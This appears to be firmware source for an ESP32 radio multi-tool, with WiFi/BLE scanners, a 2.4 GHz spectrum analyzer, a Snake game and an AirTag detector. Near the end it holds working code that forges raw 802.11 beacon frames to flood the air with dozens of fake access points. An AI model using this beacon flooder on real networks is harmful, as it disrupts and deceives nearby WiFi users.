/* ____________________________
   This software is licensed under the MIT License:
   https://github.com/cifertech/rfclown
   ________________________________________ */
   
#include "setting.h"
#include "config.h"

void IRAM_ATTR handleButton() {
  unsigned long currentTime = millis();
  if (currentTime - lastPressL > debounceDelay) {
    ChangeRequested = true;
    lastPressL = currentTime;
  }
}

void IRAM_ATTR handleButton1() {
  unsigned long currentTime = millis();
  if (currentTime - lastPressR > debounceDelay) {
    ChangeRequested1 = true;
    lastPressR = currentTime;
  }
}

void IRAM_ATTR handleButton2() {
  static bool wasPressed = false;
  bool pressed = (digitalRead(PIN_BTN_S) == LOW);
  unsigned long now = millis();
  if (pressed && !wasPressed) {        // genuine press transition
    wasPressed = true;
    selDownTime = now;
  } else if (!pressed && wasPressed) { // genuine release transition
    wasPressed = false;
    unsigned long dur = now - selDownTime;
    if (dur < 40) return;              // ignore glitches / super-fast taps
    if (dur >= longPressMs) SelectBack = true;      // long press -> back/exit
    else                    SelectRequested = true; // short click -> select
  }
}

// Green blink to call from inside blocking tool loops (scan / spam / etc.).
static void toolLEDTick() {
  static unsigned long lastToggle = 0;
  static bool on = false;
  unsigned long now = millis();
  if (now - lastToggle >= 200) {
    lastToggle = now;
    on = !on;
    setNeoPixelColour(on ? "green" : "null");
    webuiSnapshot();          // tool loops run for seconds; keep the mirror live
  }
}

static const uint8_t HEADER_H = 12;
static const uint8_t PAD      = 6;

static void drawHeaderBar() {
  const uint8_t W = 128;
  const uint8_t H = HEADER_H;
  const uint8_t TXT_Y = 2;
  u8g2.setDrawColor(1);
  u8g2.drawBox(0, 0, W, H);
  u8g2.setFont(FONT_SMALL);
  u8g2.setDrawColor(0);
  u8g2.drawStr(PAD, TXT_Y, "RF Clown X");
  const char* ver = FW_VERSION;
  int vw = u8g2.getStrWidth(ver);
  u8g2.drawStr(W - vw - 4, TXT_Y, ver);
  u8g2.setDrawColor(1);
  u8g2.drawHLine(0, H - 1, W);
}

static void drawMenu();
void update_OLED() {
  drawMenu();
}

// ---------------- OLED brightness tool ----------------
static void applyBrightness(uint8_t b) {
  if (b < 5) b = 5;
  oledBrightness = b;
  // On SSD1306 the contrast register (0x81) alone barely changes the visible
  // brightness. Scaling the pre-charge period (0xD9) and VCOMH deselect level
  // (0xDB) together with it gives a clearly visible change across the range.
  u8g2.setContrast(b);
  uint8_t phase2 = (uint8_t)map(b, 5, 255, 1, 15);
  u8g2.sendF("ca", 0x00D9, (uint8_t)((phase2 << 4) | 0x01));
  uint8_t vcomh = (b < 90) ? 0x00 : (b < 180 ? 0x20 : 0x30);
  u8g2.sendF("ca", 0x00DB, vcomh);
}

// Persist to NVS only when the value actually changed (flash-friendly).
static void saveBrightness() {
  Preferences prefs;
  prefs.begin("rfclown", false);
  if (prefs.getUChar("bright", 100) != oledBrightness) {
    prefs.putUChar("bright", oledBrightness);
  }
  prefs.end();
}

static void loadBrightness() {
  Preferences prefs;
  prefs.begin("rfclown", true);
  uint8_t b = prefs.getUChar("bright", 100);
  prefs.end();
  applyBrightness(b);
}

static void drawBrightnessScreen() {
  int pct = (int)map(oledBrightness, 5, 255, 0, 100);
  u8g2.clearBuffer();
  drawHeaderBar();
  u8g2.setFont(FONT_MEDIUM);
  u8g2.setCursor(PAD, HEADER_H + 6);
  u8g2.print("Brightness");
  char buf[8];
  snprintf(buf, sizeof(buf), "%d%%", pct);
  u8g2.setFont(FONT_SMALL);
  int tw = u8g2.getStrWidth(buf);
  u8g2.setCursor(128 - PAD - tw, HEADER_H + 8);
  u8g2.print(buf);
  const int bx = PAD, by = 38, bw = 128 - PAD * 2, bh = 12;
  u8g2.drawRFrame(bx, by, bw, bh, 2);
  int fillw = (int)((long)(bw - 4) * pct / 100);
  if (fillw > 0) u8g2.drawBox(bx + 2, by + 2, fillw, bh - 4);
  u8g2.setFont(FONT_SMALL);
  u8g2.setCursor(PAD, 56);
  u8g2.print("L:- R:+  hold:save");
  u8g2.sendBuffer();
}

static void openBrightnessMenu() {
  ChangeRequested = false;
  ChangeRequested1 = false;
  SelectRequested = false;
  SelectBack = false;
  drawBrightnessScreen();
  bool done = false;
  while (!done) {
    if (ChangeRequested) {
      ChangeRequested = false;
      applyBrightness(oledBrightness <= 15 ? 5 : (uint8_t)(oledBrightness - 15));
      drawBrightnessScreen();
    }
    if (ChangeRequested1) {
      ChangeRequested1 = false;
      applyBrightness(oledBrightness >= 240 ? 255 : (uint8_t)(oledBrightness + 15));
      drawBrightnessScreen();
    }
    if (SelectBack) {
      SelectBack = false;
      done = true;
    }
    delay(20);
  }
  SelectRequested = false;
  saveBrightness();
  update_OLED();
}

// ---------------- Back-button hold time (NVS, flash-friendly) ----------------
static void saveHoldTime() {
  Preferences prefs;
  prefs.begin("rfclown", false);
  if (prefs.getULong("holdms", 500) != longPressMs) prefs.putULong("holdms", longPressMs);
  prefs.end();
}
static void loadHoldTime() {
  Preferences prefs;
  prefs.begin("rfclown", true);
  longPressMs = prefs.getULong("holdms", 500);
  prefs.end();
  if (longPressMs < 200)  longPressMs = 200;
  if (longPressMs > 1500) longPressMs = 1500;
}
static void drawHoldTime() {
  u8g2.clearBuffer();
  drawHeaderBar();
  u8g2.setFont(FONT_MEDIUM);
  u8g2.setCursor(PAD, HEADER_H + 6);
  u8g2.print("Back hold time");
  char b[16];
  snprintf(b, sizeof(b), "%lu ms", longPressMs);
  int tw = u8g2.getStrWidth(b);
  u8g2.setCursor((128 - tw) / 2, 34);
  u8g2.print(b);
  u8g2.setFont(FONT_SMALL);
  u8g2.setCursor(PAD, 56);
  u8g2.print("L:- R:+  hold:save");
  u8g2.sendBuffer();
}
static void openHoldTime() {
  ChangeRequested = false; ChangeRequested1 = false; SelectRequested = false; SelectBack = false;
  drawHoldTime();
  bool done = false;
  while (!done) {
    if (ChangeRequested)  { ChangeRequested = false;  if (longPressMs > 200)  longPressMs -= 50; drawHoldTime(); }
    if (ChangeRequested1) { ChangeRequested1 = false; if (longPressMs < 1500) longPressMs += 50; drawHoldTime(); }
    if (SelectBack)       { SelectBack = false; done = true; }
    delay(20);
  }
  SelectRequested = false;
  saveHoldTime();
  update_OLED();
}

// ---------------- About ----------------
static void openAbout() {
  ChangeRequested = false; ChangeRequested1 = false; SelectRequested = false; SelectBack = false;
  setNeoPixelColour("blue");
  u8g2.clearBuffer();
  u8g2.setDrawColor(1); u8g2.drawBox(0, 0, 128, HEADER_H);
  u8g2.setDrawColor(0); u8g2.setFont(FONT_SMALL);
  u8g2.drawStr(PAD, 2, "About");
  u8g2.drawStr(128 - u8g2.getStrWidth("hold:back") - 3, 2, "hold:back");
  u8g2.setDrawColor(1); u8g2.setFont(FONT_SMALL);
  int y = HEADER_H + 2;
  u8g2.setCursor(2, y); u8g2.print("RF Clown X " FW_VERSION); y += 10;
  u8g2.setCursor(2, y); u8g2.print("Fork by fcortell");        y += 10;
  u8g2.setCursor(2, y); u8g2.print("github.com/fcortell/");    y += 9;
  u8g2.setCursor(2, y); u8g2.print("RF-Clown-X");            y += 10;
  u8g2.setCursor(2, y); u8g2.print("Base: cifertech RF-Clown");
  u8g2.sendBuffer();
  while (!SelectBack) { delay(30); }
  SelectRequested = false; SelectBack = false;
  update_OLED();
}

// ---------------- WiFi / BLE scanner tool ----------------
static void scannerMessage(const char* msg) {
  u8g2.clearBuffer();
  drawHeaderBar();
  u8g2.setFont(FONT_MEDIUM);
  u8g2.setCursor(PAD, HEADER_H + 14);
  u8g2.print(msg);
  u8g2.sendBuffer();
}

static void drawScanList(const char* title, int found, String* items, int* rssis, int count, int sel) {
  u8g2.clearBuffer();
  u8g2.setDrawColor(1);
  u8g2.drawBox(0, 0, 128, HEADER_H);
  u8g2.setDrawColor(0);
  u8g2.setFont(FONT_SMALL);
  char hdr[24];
  snprintf(hdr, sizeof(hdr), "%s (%d)", title, found);
  u8g2.drawStr(PAD, 2, hdr);
  u8g2.drawStr(128 - u8g2.getStrWidth("hold:back") - 3, 2, "hold:back");
  u8g2.setDrawColor(1);

  if (count == 0) {
    u8g2.setFont(FONT_SMALL);
    u8g2.setCursor(PAD, HEADER_H + 14);
    u8g2.print("Nothing found");
    u8g2.sendBuffer();
    return;
  }

  const int rowH = 11;
  const int rows = 4;
  int startIdx = (sel / rows) * rows;
  for (int r = 0; r < rows; r++) {
    int idx = startIdx + r;
    if (idx >= count) break;
    int y = HEADER_H + 1 + r * rowH;
    if (idx == sel) {
      u8g2.setDrawColor(1);
      u8g2.drawBox(0, y - 1, 128, rowH);
      u8g2.setDrawColor(0);
    } else {
      u8g2.setDrawColor(1);
    }
    u8g2.setFont(FONT_SMALL);
    char rb[8];
    snprintf(rb, sizeof(rb), "%d", rssis[idx]);
    int tw = u8g2.getStrWidth(rb);
    String line = items[idx];
    if (line.length() > 17) line = line.substring(0, 17);
    u8g2.setCursor(2, y);
    u8g2.print(line);
    u8g2.setCursor(126 - tw, y);
    u8g2.print(rb);
  }
  u8g2.setDrawColor(1);
  u8g2.sendBuffer();
}

static const char* wifiEncName(int enc) {
  switch (enc) {
    case WIFI_AUTH_OPEN:            return "Open";
    case WIFI_AUTH_WEP:             return "WEP";
    case WIFI_AUTH_WPA_PSK:         return "WPA";
    case WIFI_AUTH_WPA2_PSK:        return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK:    return "WPA/2";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-E";
    case WIFI_AUTH_WPA3_PSK:        return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK:   return "WPA2/3";
    default:                        return "?";
  }
}

static void drawApDetail(const String& ssid, const String& bssid, int ch, int rssi, int enc) {
  int freq = (ch == 14) ? 2484 : (2407 + ch * 5);
  u8g2.clearBuffer();
  u8g2.setDrawColor(1); u8g2.drawBox(0, 0, 128, HEADER_H);
  u8g2.setDrawColor(0); u8g2.setFont(FONT_SMALL);
  u8g2.drawStr(PAD, 2, "AP detail");
  u8g2.drawStr(128 - u8g2.getStrWidth("hold:back") - 3, 2, "hold:back");
  u8g2.setDrawColor(1); u8g2.setFont(FONT_SMALL);
  int y = HEADER_H + 1;
  String s = ssid; if (s.length() > 21) s = s.substring(0, 21);
  u8g2.setCursor(2, y); u8g2.print(s); y += 9;
  u8g2.setCursor(2, y); u8g2.print(bssid); y += 9;
  char b[28];
  snprintf(b, sizeof(b), "Ch %d   %d.%03d GHz", ch, freq / 1000, freq % 1000);
  u8g2.setCursor(2, y); u8g2.print(b); y += 9;
  snprintf(b, sizeof(b), "RSSI %d dBm", rssi);
  u8g2.setCursor(2, y); u8g2.print(b); y += 9;
  snprintf(b, sizeof(b), "Sec: %s", wifiEncName(enc));
  u8g2.setCursor(2, y); u8g2.print(b);
  u8g2.sendBuffer();
}

static void openWiFiScan() {
  const int MAXN = 20;
  static String ssid[MAXN], bssid[MAXN];
  static int    rssi[MAXN], chan[MAXN], enc[MAXN];

  scannerMessage("Scanning WiFi...");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false, true);
  delay(100);
  int n = WiFi.scanNetworks();
  int count = 0;
  for (int i = 0; i < n && count < MAXN; i++) {
    String s = WiFi.SSID(i);
    if (s.length() == 0) s = "<hidden>";
    ssid[count]  = s;
    rssi[count]  = WiFi.RSSI(i);
    chan[count]  = WiFi.channel(i);
    bssid[count] = WiFi.BSSIDstr(i);
    enc[count]   = (int)WiFi.encryptionType(i);
    count++;
  }
  WiFi.scanDelete();
  WiFi.mode(WIFI_OFF);

  int sel = 0;
  bool inDetail = false;
  ChangeRequested = false; ChangeRequested1 = false; SelectRequested = false; SelectBack = false;

  auto drawList = [&]() {
    u8g2.clearBuffer();
    u8g2.setDrawColor(1); u8g2.drawBox(0, 0, 128, HEADER_H);
    u8g2.setDrawColor(0); u8g2.setFont(FONT_SMALL);
    char hdr[20]; snprintf(hdr, sizeof(hdr), "WiFi (%d)", count);
    u8g2.drawStr(PAD, 2, hdr);
    u8g2.drawStr(128 - u8g2.getStrWidth("S:info") - 3, 2, "S:info");
    u8g2.setDrawColor(1);
    if (count == 0) {
      u8g2.setFont(FONT_SMALL); u8g2.setCursor(PAD, HEADER_H + 14); u8g2.print("Nothing found");
      u8g2.sendBuffer(); return;
    }
    const int rowH = 11, rows = 4;
    int startIdx = (sel / rows) * rows;
    for (int r = 0; r < rows; r++) {
      int idx = startIdx + r;
      if (idx >= count) break;
      int y = HEADER_H + 1 + r * rowH;
      if (idx == sel) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 1, 128, rowH); u8g2.setDrawColor(0); }
      else u8g2.setDrawColor(1);
      u8g2.setFont(FONT_SMALL);
      String line = ssid[idx]; if (line.length() > 13) line = line.substring(0, 13);
      char rb[12]; snprintf(rb, sizeof(rb), "c%d %d", chan[idx], rssi[idx]);
      int tw = u8g2.getStrWidth(rb);
      u8g2.setCursor(2, y); u8g2.print(line);
      u8g2.setCursor(126 - tw, y); u8g2.print(rb);
    }
    u8g2.setDrawColor(1); u8g2.sendBuffer();
  };

  drawList();
  while (true) {
    if (!inDetail) {
      if (SelectBack)       { SelectBack = false; break; }                       // exit tool
      if (ChangeRequested)  { ChangeRequested = false;  if (count > 0) sel = (sel == 0) ? count - 1 : sel - 1; drawList(); }
      if (ChangeRequested1) { ChangeRequested1 = false; if (count > 0) sel = (sel + 1) % count; drawList(); }
      if (SelectRequested)  { SelectRequested = false; if (count > 0) { inDetail = true; drawApDetail(ssid[sel], bssid[sel], chan[sel], rssi[sel], enc[sel]); } }
    } else {
      if (SelectBack)      { SelectBack = false; inDetail = false; drawList(); }  // back to list
      if (SelectRequested) { SelectRequested = false; }
      ChangeRequested = false; ChangeRequested1 = false;
    }
    toolLEDTick();
    delay(20);
  }
  SelectRequested = false; SelectBack = false;
  update_OLED();
}

static const char* bleTypeName(int t) {
  switch (t) {
    case 0: return "Public";
    case 1: return "Random";
    case 2: return "RPA-Pub";
    case 3: return "RPA-Rnd";
    default: return "?";
  }
}

static void drawBleDetail(const String& name, const String& addr, int rssi, int atype, int comp) {
  u8g2.clearBuffer();
  u8g2.setDrawColor(1); u8g2.drawBox(0, 0, 128, HEADER_H);
  u8g2.setDrawColor(0); u8g2.setFont(FONT_SMALL);
  u8g2.drawStr(PAD, 2, "BLE detail");
  u8g2.drawStr(128 - u8g2.getStrWidth("hold:back") - 3, 2, "hold:back");
  u8g2.setDrawColor(1); u8g2.setFont(FONT_SMALL);
  int y = HEADER_H + 1;
  String s = name; if (s.length() > 21) s = s.substring(0, 21);
  u8g2.setCursor(2, y); u8g2.print(s); y += 9;
  u8g2.setCursor(2, y); u8g2.print(addr); y += 9;
  char b[28];
  snprintf(b, sizeof(b), "RSSI %d dBm", rssi);
  u8g2.setCursor(2, y); u8g2.print(b); y += 9;
  snprintf(b, sizeof(b), "Type: %s", bleTypeName(atype));
  u8g2.setCursor(2, y); u8g2.print(b); y += 9;
  if (comp >= 0) snprintf(b, sizeof(b), "Company: 0x%04X", comp);
  else           snprintf(b, sizeof(b), "Company: -");
  u8g2.setCursor(2, y); u8g2.print(b);
  u8g2.sendBuffer();
}

static void openBLEScan() {
  const int MAXN = 20;
  static String name[MAXN], addr[MAXN];
  static int    rssi[MAXN], atype[MAXN], comp[MAXN];

  scannerMessage("Scanning BLE...");
  BLEDevice::init("");
  BLEScan* scan = BLEDevice::getScan();
  scan->setActiveScan(true);
  scan->setInterval(100);
  scan->setWindow(99);
  BLEScanResults* res = scan->start(4, false);
  int bn = res ? res->getCount() : 0;
  int count = 0;
  for (int i = 0; i < bn && count < MAXN; i++) {
    BLEAdvertisedDevice d = res->getDevice(i);
    String nm = d.getName();
    name[count]  = (nm.length() ? nm : String("<no name>"));
    addr[count]  = d.getAddress().toString();
    rssi[count]  = d.getRSSI();
    atype[count] = (int)d.getAddressType();
    int cid = -1;
    if (d.haveManufacturerData()) {
      String m = d.getManufacturerData();
      if (m.length() >= 2) { const uint8_t* p = (const uint8_t*)m.c_str(); cid = p[0] | (p[1] << 8); }
    }
    comp[count] = cid;
    count++;
  }
  scan->clearResults();
  BLEDevice::deinit(false);

  int sel = 0;
  bool inDetail = false;
  ChangeRequested = false; ChangeRequested1 = false; SelectRequested = false; SelectBack = false;

  auto drawList = [&]() {
    u8g2.clearBuffer();
    u8g2.setDrawColor(1); u8g2.drawBox(0, 0, 128, HEADER_H);
    u8g2.setDrawColor(0); u8g2.setFont(FONT_SMALL);
    char hdr[20]; snprintf(hdr, sizeof(hdr), "BLE (%d)", count);
    u8g2.drawStr(PAD, 2, hdr);
    u8g2.drawStr(128 - u8g2.getStrWidth("S:info") - 3, 2, "S:info");
    u8g2.setDrawColor(1);
    if (count == 0) {
      u8g2.setFont(FONT_SMALL); u8g2.setCursor(PAD, HEADER_H + 14); u8g2.print("Nothing found");
      u8g2.sendBuffer(); return;
    }
    const int rowH = 11, rows = 4;
    int startIdx = (sel / rows) * rows;
    for (int r = 0; r < rows; r++) {
      int idx = startIdx + r;
      if (idx >= count) break;
      int y = HEADER_H + 1 + r * rowH;
      if (idx == sel) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 1, 128, rowH); u8g2.setDrawColor(0); }
      else u8g2.setDrawColor(1);
      u8g2.setFont(FONT_SMALL);
      String line = name[idx]; if (line.length() > 15) line = line.substring(0, 15);
      char rb[8]; snprintf(rb, sizeof(rb), "%d", rssi[idx]);
      int tw = u8g2.getStrWidth(rb);
      u8g2.setCursor(2, y); u8g2.print(line);
      u8g2.setCursor(126 - tw, y); u8g2.print(rb);
    }
    u8g2.setDrawColor(1); u8g2.sendBuffer();
  };

  drawList();
  while (true) {
    if (!inDetail) {
      if (SelectBack)       { SelectBack = false; break; }
      if (ChangeRequested)  { ChangeRequested = false;  if (count > 0) sel = (sel == 0) ? count - 1 : sel - 1; drawList(); }
      if (ChangeRequested1) { ChangeRequested1 = false; if (count > 0) sel = (sel + 1) % count; drawList(); }
      if (SelectRequested)  { SelectRequested = false; if (count > 0) { inDetail = true; drawBleDetail(name[sel], addr[sel], rssi[sel], atype[sel], comp[sel]); } }
    } else {
      if (SelectBack)      { SelectBack = false; inDetail = false; drawList(); }
      if (SelectRequested) { SelectRequested = false; }
      ChangeRequested = false; ChangeRequested1 = false;
    }
    toolLEDTick();
    delay(20);
  }
  SelectRequested = false; SelectBack = false;
  update_OLED();
}

// ---------------- 2.4GHz spectrum analyzer tool ----------------
// Uses one NRF24 as a "poor man's" spectrum analyzer: it hops across the 126
// 1 MHz channels, samples the Received Power Detector (RPD) on each, and draws
// the accumulated activity as vertical bars (left = 2.400 GHz, right = 2.525 GHz).
static void drawSpectrumBars(const uint8_t* v, int count, int base, int ploth) {
  u8g2.clearBuffer();
  u8g2.setDrawColor(1);
  u8g2.drawBox(0, 0, 128, HEADER_H);
  u8g2.setDrawColor(0);
  u8g2.setFont(FONT_SMALL);
  u8g2.drawStr(PAD, 2, "Spectrum");
  u8g2.drawStr(128 - u8g2.getStrWidth("hold:back") - 3, 2, "hold:back");
  u8g2.setDrawColor(1);
  u8g2.drawHLine(0, base + 1, 128);
  for (int ch = 0; ch < count; ch++) {
    int h = v[ch];
    if (h <= 0) continue;
    if (h > ploth) h = ploth;
    int x = (ch * 127) / (count - 1);
    u8g2.drawVLine(x, base - h, h);
  }
  u8g2.sendBuffer();
}

static void openSpectrum() {
  const int CH = 126;
  const int TOP = HEADER_H + 3;
  const int BASE = SCREEN_H - 3;
  const int PLOTH = BASE - TOP;
  static uint8_t values[CH];
  for (int i = 0; i < CH; i++) values[i] = 0;

  // Configure RadioA for passive carrier detection.
  RadioA.begin();
  RadioA.setAutoAck(false);
  RadioA.disableCRC();
  RadioA.setDataRate(RF24_1MBPS);
  RadioA.setPALevel(RF24_PA_MIN);
  RadioA.stopListening();

  ChangeRequested = false;
  ChangeRequested1 = false;
  SelectRequested = false;
  SelectBack = false;

  while (!SelectBack) {
    for (int ch = 0; ch < CH; ch++) {
      RadioA.setChannel(ch);
      RadioA.startListening();
      delayMicroseconds(140);
      RadioA.stopListening();
      if (RadioA.testRPD() || RadioA.testCarrier()) {
        int nv = values[ch] + 6;
        values[ch] = (nv > PLOTH) ? PLOTH : nv;
      } else if (values[ch] > 0) {
        values[ch] -= 1;  // slow decay so peaks stay visible
      }
    }
    drawSpectrumBars(values, CH, BASE, PLOTH);
    toolLEDTick();
  }
  SelectRequested = false; SelectBack = false;

  RadioA.powerDown();
  setRadiosNeutralState();
  update_OLED();
}

// ---------------- Snake game ----------------
// Two-button relative steering: Left = turn left, Right = turn right, so the
// snake can never instantly reverse into itself. Select exits.
// Easter egg: reaching 7 points flashes "AGENT 007" with a golden NeoPixel wink.
static void openSnake() {
  const int CELL = 4;
  const int COLS = SCREEN_W / CELL;   // 32
  const int ROWS = SCREEN_H / CELL;   // 16
  const int MAXLEN = COLS * ROWS;     // 512
  static uint8_t sx[512], sy[512];
  int len, dir, headx, heady, foodx, foody, score;
  unsigned long stepMs;
  bool gameOver, bonusShown;

  auto placeFood = [&]() {
    bool ok = false;
    while (!ok) {
      foodx = random(0, COLS);
      foody = random(0, ROWS);
      ok = true;
      for (int i = 0; i < len; i++) if (sx[i] == foodx && sy[i] == foody) { ok = false; break; }
    }
  };
  auto reset = [&]() {
    len = 3; dir = 1;
    headx = COLS / 2; heady = ROWS / 2;
    score = 0; stepMs = 180; gameOver = false; bonusShown = false;
    for (int i = 0; i < len; i++) { sx[i] = headx - i; sy[i] = heady; }
    placeFood();
  };

  reset();
  ChangeRequested = false; ChangeRequested1 = false; SelectRequested = false; SelectBack = false;
  unsigned long last = millis();

  while (true) {
    if (SelectBack)  { SelectBack = false; break; }
    if (ChangeRequested)  { ChangeRequested = false;  if (gameOver) { reset(); last = millis(); } else dir = (dir + 3) & 3; }
    if (ChangeRequested1) { ChangeRequested1 = false; if (gameOver) { reset(); last = millis(); } else dir = (dir + 1) & 3; }

    unsigned long now = millis();
    if (!gameOver && now - last >= stepMs) {
      last = now;
      int nx = headx, ny = heady;
      if (dir == 0) ny--; else if (dir == 1) nx++; else if (dir == 2) ny++; else nx--;
      // Wrap around the edges for an "infinite" playfield.
      if (nx < 0) nx = COLS - 1; else if (nx >= COLS) nx = 0;
      if (ny < 0) ny = ROWS - 1; else if (ny >= ROWS) ny = 0;
      bool grow = (nx == foodx && ny == foody);
      {
        bool hit = false;
        for (int i = 0; i < len; i++) {
          if (i == len - 1 && !grow) continue;   // tail frees its cell unless growing
          if (sx[i] == nx && sy[i] == ny) { hit = true; break; }
        }
        if (hit) {
          gameOver = true;
        } else {
          if (grow && len < MAXLEN) len++;
          for (int i = len - 1; i > 0; i--) { sx[i] = sx[i - 1]; sy[i] = sy[i - 1]; }
          sx[0] = nx; sy[0] = ny; headx = nx; heady = ny;
          if (grow) {
            score++;
            if (stepMs > 70) stepMs -= 6;
            placeFood();
          }
        }
      }
    }

    u8g2.clearBuffer();
    u8g2.setDrawColor(1);
    u8g2.drawFrame(0, 0, SCREEN_W, SCREEN_H);
    u8g2.drawFrame(foodx * CELL, foody * CELL, CELL, CELL);
    for (int i = 0; i < len; i++) u8g2.drawBox(sx[i] * CELL, sy[i] * CELL, CELL - 1, CELL - 1);
    if (gameOver) {
      u8g2.setDrawColor(1); u8g2.drawBox(12, 18, 104, 28);
      u8g2.setDrawColor(0);
      u8g2.setFont(FONT_MEDIUM); u8g2.setCursor(24, 22); u8g2.print("GAME OVER");
      char b[22];
      snprintf(b, sizeof(b), "Score %d - L/R:retry", score);
      u8g2.setFont(FONT_SMALL); u8g2.setCursor(18, 36); u8g2.print(b);
      u8g2.setDrawColor(1);
    }
    u8g2.sendBuffer();

    if (!gameOver && score >= 7 && !bonusShown) {
      bonusShown = true;
      setNeoPixelColour("yellow");
      for (int k = 0; k < 3; k++) {
        u8g2.setDrawColor(1); u8g2.drawBox(20, 22, 88, 20);
        u8g2.setDrawColor(0); u8g2.setFont(FONT_MEDIUM); u8g2.setCursor(32, 27); u8g2.print("AGENT 007");
        u8g2.setDrawColor(1); u8g2.sendBuffer();
        delay(180);
        u8g2.clearBuffer(); u8g2.sendBuffer(); delay(120);
      }
      setNeoPixelColour("blue");
      last = millis();
    }

    delay(12);
  }

  SelectRequested = false; SelectBack = false;
  setNeoPixelColour("blue");
  update_OLED();
}

// ---------------- WiFi beacon (AP clone) spam ----------------
// Pick a network from a scan, then flood the air with beacon frames that clone
// its SSID under many random BSSIDs, so it appears as dozens of access points.
static bool sendCloneBeacon(const char* ssid, uint8_t ssidLen, const uint8_t* bssid, uint8_t channel) {
  uint8_t pkt[128];
  int i = 0;
  pkt[i++] = 0x80; pkt[i++] = 0x00;                 // frame control: beacon
  pkt[i++] = 0x00; pkt[i++] = 0x00;                 // duration
  for (int k = 0; k < 6; k++) pkt[i++] = 0xff;      // dest: broadcast
  for (int k = 0; k < 6; k++) pkt[i++] = bssid[k];  // source
  for (int k = 0; k < 6; k++) pkt[i++] = bssid[k];  // BSSID
  pkt[i++] = 0x00; pkt[i++] = 0x00;                 // seq
  for (int k = 0; k < 8; k++) pkt[i++] = 0x00;      // timestamp
  pkt[i++] = 0x64; pkt[i++] = 0x00;                 // beacon interval
  pkt[i++] = 0x01; pkt[i++] = 0x04;                 // capability info (ESS)
  pkt[i++] = 0x00; pkt[i++] = ssidLen;              // SSID tag
  for (int k = 0; k < ssidLen; k++) pkt[i++] = ssid[k];
  pkt[i++] = 0x01; pkt[i++] = 0x08;                 // supported rates
  pkt[i++] = 0x82; pkt[i++] = 0x84; pkt[i++] = 0x8b; pkt[i++] = 0x96;
  pkt[i++] = 0x24; pkt[i++] = 0x30; pkt[i++] = 0x48; pkt[i++] = 0x6c;
  pkt[i++] = 0x03; pkt[i++] = 0x01; pkt[i++] = channel;  // DS param: channel
  return esp_wifi_80211_tx(WIFI_IF_AP, pkt, i, false) == ESP_OK;
}

static void drawSpamStatus(int fakeAPs, unsigned long frames) {
  u8g2.clearBuffer();
  u8g2.setDrawColor(1);
  u8g2.drawBox(0, 0, 128, HEADER_H);
  u8g2.setDrawColor(0);
  u8g2.setFont(FONT_SMALL);
  u8g2.drawStr(PAD, 2, "AP Spam");
  u8g2.drawStr(128 - u8g2.getStrWidth("hold:back") - 3, 2, "hold:back");
  u8g2.setDrawColor(1);
  u8g2.setFont(FONT_MEDIUM);
  u8g2.setCursor(PAD, HEADER_H + 6);
  u8g2.print("Flooding APs");
  u8g2.setFont(FONT_SMALL);
  char b[24];
  snprintf(b, sizeof(b), "Fake APs: %d", fakeAPs);
  u8g2.setCursor(PAD, HEADER_H + 22);
  u8g2.print(b);
  snprintf(b, sizeof(b), "Frames: %lu", frames);
  u8g2.setCursor(PAD, HEADER_H + 34);
  u8g2.print(b);
  u8g2.sendBuffer();
}

static void openBeaconSpam() {
  // Fill the air with many random-named access points to flood WiFi lists.
  const int NUM = 40;
  static char    names[NUM][20];
  static uint8_t bssids[NUM][6];
  static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  const int csn = sizeof(charset) - 1;

  for (int i = 0; i < NUM; i++) {
    int len = random(6, 14);
    for (int j = 0; j < len; j++) names[i][j] = charset[random(0, csn)];
    names[i][len] = '\0';
    bssids[i][0] = 0x02;                        // locally administered, unicast
    for (int k = 1; k < 6; k++) bssids[i][k] = (uint8_t)random(0, 256);
  }

  WiFi.mode(WIFI_MODE_APSTA);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);

  const uint8_t channels[3] = {1, 6, 11};
  unsigned long frames = 0;
  int chIdx = 0;
  ChangeRequested = false; ChangeRequested1 = false; SelectRequested = false; SelectBack = false;
  unsigned long lastDraw = 0;

  while (!SelectBack) {
    uint8_t ch = channels[chIdx];
    chIdx = (chIdx + 1) % 3;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < NUM; i++) {
      if (sendCloneBeacon(names[i], (uint8_t)strlen(names[i]), bssids[i], ch)) frames++;
    }
    unsigned long now = millis();
    if (now - lastDraw >= 200) {
      lastDraw = now;
      drawSpamStatus(NUM, frames);
    }
    toolLEDTick();
  }
  SelectRequested = false; SelectBack = false;

  WiFi.mode(WIFI_OFF);
  update_OLED();
}

// ---------------- AirTag / Find My sniffer ----------------
// Detects Apple Find My advertisements (company ID 0x004C, type 0x12), which
// AirTags and other Find My trackers broadcast. Useful for spotting an unknown
// tracker nearby: the live RSSI rises as you get closer to it.
static void openAirtagScan() {
  const int MAXN = 16;
  static String addrs[MAXN];
  static int    rssis[MAXN];
  int count = 0;
  int sel = 0;

  BLEDevice::init("");
  BLEScan* scan = BLEDevice::getScan();
  scan->setActiveScan(true);
  scan->setInterval(100);
  scan->setWindow(99);

  ChangeRequested = false; ChangeRequested1 = false; SelectRequested = false; SelectBack = false;
  scannerMessage("Sniffing AirTags...");

  while (!SelectBack) {
    BLEScanResults* res = scan->start(2, false);
    int bn = res ? res->getCount() : 0;
    count = 0;
    for (int i = 0; i < bn && count < MAXN; i++) {
      BLEAdvertisedDevice d = res->getDevice(i);
      if (!d.haveManufacturerData()) continue;
      String m = d.getManufacturerData();
      if (m.length() < 3) continue;
      const uint8_t* p = (const uint8_t*)m.c_str();
      if (!(p[0] == 0x4C && p[1] == 0x00 && p[2] == 0x12)) continue;  // Apple Find My
      addrs[count] = d.getAddress().toString();
      rssis[count] = d.getRSSI();
      count++;
    }
    scan->clearResults();

    if (ChangeRequested)  { ChangeRequested = false;  if (count > 0) sel = (sel == 0) ? count - 1 : sel - 1; }
    if (ChangeRequested1) { ChangeRequested1 = false; if (count > 0) sel = (sel + 1) % count; }
    if (sel >= count) sel = 0;

    drawScanList("AirTags", count, addrs, rssis, count, sel);
  }
  SelectRequested = false; SelectBack = false;

  BLEDevice::deinit(false);
  update_OLED();
}

// ---------------- System info ----------------
